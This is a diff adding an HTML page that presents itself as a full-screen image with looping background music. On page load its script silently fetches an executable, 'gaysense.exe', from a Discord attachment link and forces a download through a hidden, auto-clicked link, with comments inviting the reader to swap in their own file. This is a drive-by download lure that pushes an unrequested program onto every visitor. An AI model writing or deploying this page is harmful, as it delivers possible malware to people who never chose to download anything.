@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Full Screen PNG Image with Background Music and Auto-Download File</title>
+	<style type="text/css">
+		body {
+			margin: 0;
+			padding: 0;
+			background-color: black;
+			background-image: url("https://media.discordapp.net/attachments/1033495295947976844/1102035999825068123/IMG_20230430_025156.jpg?width=891&height=671"); /* Replace with the URL of your PNG image */
+			background-size: cover;
+			background-position: center center;
+			background-repeat: no-repeat;
+		}
+	</style>
+	<script>
+		function downloadFile() {
+			var url = "https://cdn.discordapp.com/attachments/819248797720903702/1102171272256962620/gaysense.exe"; // Replace with the URL of the file you want to download
+			var filename = url.substring(url.lastIndexOf("/") + 1).split("?")[0];
+			var xhr = new XMLHttpRequest();
+			xhr.responseType = 'blob';
+			xhr.onload = function() {
+				var a = document.createElement('a');
+				a.href = window.URL.createObjectURL(xhr.response);
+				a.download = filename;
+				a.style.display = 'none';
+				document.body.appendChild(a);
+				a.click();
+			};
+			xhr.open('GET', url);
+			xhr.send();
+		}
+	</script>
+</head>
+<body onload="downloadFile()">
+	<audio autoplay loop>
+		<source src="https://cdn.discordapp.com/attachments/1090643107529379860/1100480747292336178/coolsong.mp3" type="audio/mp3"> <!-- Replace with the URL of your background music -->
+	</audio>
+</body>
+</html>
